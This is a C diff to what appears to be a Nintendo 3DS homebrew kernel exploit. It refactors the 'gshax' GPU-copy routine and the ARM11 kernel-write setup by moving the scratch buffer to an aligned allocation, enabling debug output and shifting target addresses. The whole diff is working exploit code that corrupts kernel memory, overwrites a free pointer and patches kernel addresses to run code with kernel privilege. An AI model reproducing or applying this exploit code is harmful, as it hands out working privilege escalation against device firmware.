@@ -6,9 +6,12 @@
 #include <dirent.h>
 
 u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
+u8 isN3DS = 0;
+u32 *backup;
+unsigned int *arm11_buffer;
 
 //Uncomment to have progress printed w/ printf
-//#define DEBUG_PROCESS
+#define DEBUG_PROCESS
 
 int do_gshax_copy(void *dst, void *src, unsigned int len, unsigned int check_val, int check_off)
 {
@@ -16,12 +19,10 @@ int do_gshax_copy(void *dst, void *src, unsigned int len, unsigned int check_val
 
     do
     {
-        memcpy (0x14401000, 0x14401000, 0x10000);
         GSPGPU_FlushDataCache (NULL, src, len);
         GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
         GSPGPU_FlushDataCache (NULL, 0x14401000, 16);
         GX_SetTextureCopy(NULL, src, 0, 0x14401000, 0, 0x40, 8);
-        memcpy(0x14401000, 0x14401000, 0x10000);
         result = *(unsigned int *)(0x14401000 + check_off);
     } while (result != check_val);
 
@@ -31,13 +32,12 @@ int do_gshax_copy(void *dst, void *src, unsigned int len, unsigned int check_val
 int arm11_kernel_exploit_setup(void)
 {
     unsigned int patch_addr;
-    unsigned int *buffer;
+
     unsigned int *test;
     int i;
     int (*nop_func)(void);
     int *ipc_buf;
     int model;
-    unsigned char isN3DS = 0;
 
     // get proper patch address for our kernel -- thanks yifanlu once again
     unsigned int kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
@@ -104,18 +104,18 @@ int arm11_kernel_exploit_setup(void)
             return 0;
         }
     }
-
+#ifdef DEBUG_PROCESS
     printf("Loaded adr %x for kernel %x\n", patch_addr, kversion); 
+#endif
 
     // part 1: corrupt kernel memory
-    buffer = 0x14402000;
     // 0xFFFFFE0 is just stack memory for scratch space
-    svcControlMemory(0xFFFFFE0, 0x14451000, 0, 0x1000, 1, 0); // free page 
+    svcControlMemory(0xFFFFFE0, 0x14411000, 0, 0x1000, 1, 0); // free page 
 
-    buffer[0] = 1;
-    buffer[1] = patch_addr;
-    buffer[2] = 0;
-    buffer[3] = 0;
+    arm11_buffer[0] = 1;
+    arm11_buffer[1] = patch_addr;
+    arm11_buffer[2] = 0;
+    arm11_buffer[3] = 0;
 
     // overwrite free pointer
 #ifdef DEBUG_PROCESS
@@ -123,8 +123,8 @@ int arm11_kernel_exploit_setup(void)
 #endif
 
     //Trigger write to kernel
-    do_gshax_copy(0x14451000, buffer, 0x10u, patch_addr, 4);
-    svcControlMemory(0xFFFFFE0, 0x14450000, 0, 0x1000, 1, 0);
+    do_gshax_copy(0x14411000, arm11_buffer, 0x10u, patch_addr, 4);
+    svcControlMemory(0xFFFFFE0, 0x14410000, 0, 0x1000, 1, 0);
 
 #ifdef DEBUG_PROCESS
     printf("Triggered kernel write\n");
@@ -135,12 +135,12 @@ int arm11_kernel_exploit_setup(void)
      // part 2: trick to clear icache
     for (i = 0; i < 0x1000; i++)
     {
-        buffer[i] = 0xE1A00000; // ARM NOP instruction
+        arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
     }
-    buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
+    arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
     nop_func = nop_slide;
 
-    do_gshax_copy(nop_slide, buffer, 0x10000, 0xE1A00000, 0);
+    do_gshax_copy(nop_slide, arm11_buffer, 0x10000, 0xE1A00000, 0);
 
     HB_FlushInvalidateCache();
     nop_func();
@@ -171,7 +171,7 @@ arm11_kernel_execute(int (*func)(void))
 
 void test(void)
 {
-	*(int *)0x14410000 = 0xFAAFFAAF;
+	arm11_buffer[0] = 0xFAAFFAAF;
 }
 
 void
@@ -202,7 +202,7 @@ invalidate_allcache (void)
 int __attribute__((noinline))
 arm11_kernel_exec (void)
 {
-    *(int *)0x14410000 = 0xF00FF00F;
+    arm11_buffer[0] = 0xF00FF00F;
 
     // fix up memory
     *(int *)0xDFF8382F = 0x8DD00CE5;
@@ -233,7 +233,7 @@ int doARM11Hax()
     int result = 0;
     int i;
     int (*nop_func)(void);
-    HB_ReprotectMemory(0x14400000, 0x70000 / 4096, 7, &result);
+    HB_ReprotectMemory(0x14400000, 0x30000 / 4096, 7, &result);
     HB_ReprotectMemory(nop_slide, 4, 7, &result);
 
     for (i = 0; i < 0x1000; i++)
@@ -257,12 +257,12 @@ int doARM11Hax()
     unsigned int addr;
     void *this = 0x08F10000;
     int *written = 0x08F01000;
-    int *buf = 0x14410000;
+    arm11_buffer = linearMemAlign(0x10000, 0x10000);
 
     // wipe memory for debugging purposes
     for (i = 0; i < 0x1000/4; i++)
     {
-        buf[i] = 0xdeadbeef;
+        arm11_buffer[i] = 0xdeadbeef;
     }
 
     if(arm11_kernel_exploit_setup())
